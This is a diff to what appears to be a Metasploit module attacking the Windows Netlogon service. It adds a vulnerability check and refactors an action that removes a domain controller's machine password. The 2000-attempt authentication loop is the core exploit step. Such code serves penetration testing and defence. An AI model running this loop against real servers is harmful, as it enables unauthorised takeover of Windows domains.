@@ -9,6 +9,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Report
 
+  CheckCode = Exploit::CheckCode
   Netlogon = RubySMB::Dcerpc::Netlogon
   EMPTY_SHARED_SECRET = OpenSSL::Digest::MD4.digest('')
 
@@ -62,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
     "#{rhost}:#{@dport || datastore['RPORT']}"
   end
 
-  def run
+  def bind_to_netlogon_service
     @dport = datastore['RPORT']
     if @dport.nil? || @dport == 0
       @dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], Netlogon::UUID, '1.0', 'ncacn_ip_tcp')
@@ -74,7 +75,25 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Binding to #{handle} ...")
     dcerpc_bind(handle)
     print_status("Bound to #{handle} ...")
+  end
 
+  def check
+    bind_to_netlogon_service
+
+    status = nil
+    2000.times do
+      netr_server_req_challenge
+      response = netr_server_authenticate3
+
+      break if (status = response.status) == 0
+    end
+
+    return CheckCode::Detected unless status == 0
+
+    CheckCode::Vulnerable
+  end
+
+  def run
     case action.name
     when 'REMOVE'
       action_remove_password
@@ -84,15 +103,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_remove_password
-    status = nil
-    2000.times do
-      netr_server_req_challenge
-      response = netr_server_authenticate3
+    fail_with(Failure::Unknown, 'Failed to authenticate to the server by leveraging the vulnerability') unless check == CheckCode::Vulnerable
 
-      break if (status = response.status) == 0
-    end
-
-    fail_with(Failure::Unknown, 'Failed to authenticate to the server by leveraging the vulnerability') unless status == 0
     print_good('Successfully authenticated')
 
     report_vuln(
@@ -113,6 +125,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_restore_password
+    bind_to_netlogon_service
     client_challenge = OpenSSL::Random.random_bytes(8)
 
     response = netr_server_req_challenge(client_challenge: client_challenge)
